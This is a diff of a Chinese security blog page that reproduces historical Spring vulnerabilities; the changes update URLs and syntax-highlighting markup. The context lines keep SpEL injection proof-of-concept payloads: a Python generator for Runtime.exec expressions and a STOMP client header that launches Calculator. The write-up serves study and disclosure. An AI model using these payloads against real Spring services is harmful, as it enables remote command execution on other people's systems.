@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>水文 - Spring历史漏洞复现 - Theoyu</title>
 
 <meta name="description" content="">
-<link rel="canonical" href="http://localhost:4000/2022/spring"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+<link rel="canonical" href="https://theoyu.top/2022/spring"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
 <meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
 
@@ -730,16 +730,16 @@ LTEyVDE0OjIwOjU5KzAwOjAw/4GGiQAAAABJRU5ErkJggg==" />
 
 <p>生成poc：</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">message</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'Enter message to encode:'</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">message</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="s">'Enter message to encode:'</span><span class="p">)</span>
 
-<span class="n">poc</span> <span class="o">=</span> <span class="s">'${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)'</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">message</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+<span class="n">poc</span> <span class="o">=</span> <span class="s">'${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)'</span> <span class="o">%</span> <span class="nf">ord</span><span class="p">(</span><span class="n">message</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
 
 <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">message</span><span class="p">[</span><span class="mi">1</span><span class="p">:]:</span>
-   <span class="n">poc</span> <span class="o">+=</span> <span class="s">'.concat(T(java.lang.Character).toString(%s))'</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> 
+   <span class="n">poc</span> <span class="o">+=</span> <span class="s">'.concat(T(java.lang.Character).toString(%s))'</span> <span class="o">%</span> <span class="nf">ord</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> 
 
 <span class="n">poc</span> <span class="o">+=</span> <span class="s">')}'</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">poc</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">poc</span><span class="p">)</span>
 </code></pre></div></div>
 
 <h2 id="error-page-表达式注入">Error Page 表达式注入</h2>
@@ -1004,15 +1004,15 @@ ${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{111, 11
 
 <p>打开app.js文件，修改<code class="language-plaintext highlighter-rouge">connect()</code>函数：</p>
 
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">connect</span><span class="p">()</span> <span class="p">{</span>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">connect</span><span class="p">()</span> <span class="p">{</span>
     <span class="kd">var</span> <span class="nx">header</span>  <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">selector</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">T(java.lang.Runtime).getRuntime().exec('open -a Calculator')</span><span class="dl">"</span><span class="p">};</span>
-    <span class="kd">var</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SockJS</span><span class="p">(</span><span class="dl">'</span><span class="s1">/gs-guide-websocket</span><span class="dl">'</span><span class="p">);</span>
-    <span class="nx">stompClient</span> <span class="o">=</span> <span class="nx">Stomp</span><span class="p">.</span><span class="nx">over</span><span class="p">(</span><span class="nx">socket</span><span class="p">);</span>
-    <span class="nx">stompClient</span><span class="p">.</span><span class="nx">connect</span><span class="p">({},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">frame</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">setConnected</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
-        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Connected: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">frame</span><span class="p">);</span>
-        <span class="nx">stompClient</span><span class="p">.</span><span class="nx">subscribe</span><span class="p">(</span><span class="dl">'</span><span class="s1">/topic/greetings</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">greeting</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nx">showGreeting</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">greeting</span><span class="p">.</span><span class="nx">body</span><span class="p">).</span><span class="nx">content</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SockJS</span><span class="p">(</span><span class="dl">'</span><span class="s1">/gs-guide-websocket</span><span class="dl">'</span><span class="p">);</span>
+    <span class="nx">stompClient</span> <span class="o">=</span> <span class="nx">Stomp</span><span class="p">.</span><span class="nf">over</span><span class="p">(</span><span class="nx">socket</span><span class="p">);</span>
+    <span class="nx">stompClient</span><span class="p">.</span><span class="nf">connect</span><span class="p">({},</span> <span class="nf">function </span><span class="p">(</span><span class="nx">frame</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">setConnected</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Connected: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">frame</span><span class="p">);</span>
+        <span class="nx">stompClient</span><span class="p">.</span><span class="nf">subscribe</span><span class="p">(</span><span class="dl">'</span><span class="s1">/topic/greetings</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">greeting</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nf">showGreeting</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">greeting</span><span class="p">.</span><span class="nx">body</span><span class="p">).</span><span class="nx">content</span><span class="p">);</span>
         <span class="p">},</span><span class="nx">header</span><span class="p">);</span>
     <span class="p">});</span>
 <span class="p">}</span>
@@ -1291,7 +1291,7 @@ git checkout v3.1.0
 xxx
 </code></pre></div></div>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014709.png" alt="ban" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014709.png" alt="ban" /></p>
 
 <h3 id="漏洞分析-4">漏洞分析</h3>
 
@@ -1299,15 +1299,15 @@ xxx
 
 <p>那是从何定位到<code class="language-plaintext highlighter-rouge">RoutingFunction</code>的呢？从调用栈分析，正是我们的配置文件<code class="language-plaintext highlighter-rouge">spring.cloud.function.definition:functionRouter</code>所决定。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014641.png" alt="image-20220327010606797" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014641.png" alt="image-20220327010606797" /></p>
 
 <p>回到<code class="language-plaintext highlighter-rouge">apply()</code>方法，这里把input类型转化为Message，其中含有http请求的请求头信息。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014640.png" alt="image-20220327012244218" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014640.png" alt="image-20220327012244218" /></p>
 
 <p>进入到if语句，从请求头中获取了<code class="language-plaintext highlighter-rouge">spring.cloud.function.routing-expression</code>的值 ，跟进<code class="language-plaintext highlighter-rouge">functionFromExpression()</code>:</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014656.png" alt="image-20220327013244138" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014656.png" alt="image-20220327013244138" /></p>
 
 <p>expression表达式采用<code class="language-plaintext highlighter-rouge">StandardEvaluationContext</code>类型的Context，导致了Spel表达式注入漏洞。</p>
 
@@ -1315,7 +1315,7 @@ xxx
 
 <p>在官方patch中，对从请求头获取的<code class="language-plaintext highlighter-rouge">spring.cloud.function.routing-expression</code>添加了<code class="language-plaintext highlighter-rouge">true</code>参数，在<code class="language-plaintext highlighter-rouge">functionFromExpression()</code>判断是否从请求头获取，是则使用<code class="language-plaintext highlighter-rouge">SimpleEvaluationContext</code>类型Contex处理。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014659.png" alt="image-20220327014145343" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220327014659.png" alt="image-20220327014145343" /></p>
 </div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2022-02-11T00:00:00+08:00"><!-- start custom article footer snippet -->
 
 <!-- end custom article footer snippet -->
@@ -1362,7 +1362,7 @@ xxx
   *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
   *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
   var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/2022/spring';
+    this.page.url = 'https://theoyu.top/2022/spring';
     this.page.identifier = 'Spring';
   };
   (function() { // DON'T EDIT BELOW THIS LINE
